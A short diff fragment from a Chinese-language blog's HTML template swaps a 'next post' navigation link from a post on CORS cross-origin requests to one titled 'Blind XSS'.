-            <a href="/2018/12/23/第九篇翻译：CORS跨域请求/" title="下一篇: 第九篇翻译：CORS跨域请求">
+            <a href="/2019/02/15/第十六篇：盲注XSS/" title="下一篇: 第十六篇：盲注XSS">
                 <i class="fa fa-angle-right"></i>
             </a>
         
